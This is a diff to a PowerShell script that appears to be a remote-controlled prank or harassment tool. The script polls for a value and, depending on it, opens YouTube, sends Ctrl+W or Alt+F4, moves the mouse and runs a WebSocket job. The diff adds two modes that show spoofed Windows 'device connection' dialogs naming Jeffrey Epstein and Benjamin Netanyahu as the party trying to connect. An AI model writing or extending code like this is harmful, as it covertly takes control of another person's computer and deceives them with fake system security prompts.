@@ -7,6 +7,8 @@ $youtubeStarted = $false
 $ctrlWStarted = $false
 $altF4Started = $false
 $mouseJobStarted = $false
+$msg12Shown = $false
+$msg13Shown = $false
 $wsJob = $null
 
 Add-Type @"
@@ -437,6 +439,8 @@ while ($true) {
     if ($value -ne "2")  { $youtubeStarted = $false }
     if ($value -ne "8")  { $ctrlWStarted   = $false }
     if ($value -ne "9")  { $altF4Started   = $false }
+    if ($value -ne "12") { $msg12Shown = $false }
+    if ($value -ne "13") { $msg13Shown = $false }
 
     switch ($value) {
         "-1" {
@@ -535,9 +539,25 @@ while ($true) {
                 Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [11] WebSocket nie byl aktywny" -ForegroundColor Gray
             }
         }
+        "12" {
+             if (-not $msg12Shown) {
+                Add-Type -AssemblyName System.Windows.Forms
+                [System.Windows.Forms.MessageBox]::Show("Jeffrey Epstein chce sie polaczyc z urzadzeniem.","Polaczenie urzadzenia",[System.Windows.Forms.MessageBoxButtons]::YesNo,[System.Windows.Forms.MessageBoxIcon]::Question)
+                $msg12Shown = $true
+            }
+        }
+        "13" {
+            if (-not $msg13Shown) {
+                Add-Type -AssemblyName System.Windows.Forms
+                [System.Windows.Forms.MessageBox]::Show("Benjamin Netanyahu chce sie polaczyc z urzadzeniem.","Polaczenie urzadzenia",[System.Windows.Forms.MessageBoxButtons]::YesNo,[System.Windows.Forms.MessageBoxIcon]::Question)
+                $msg13Shown = $true
+            }
+        }
+        
         default {
             Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Nieznana wartosc: '$value', czekam..." -ForegroundColor DarkGray
         }
+
     }
 
     # Flush logow z WebSocket joba
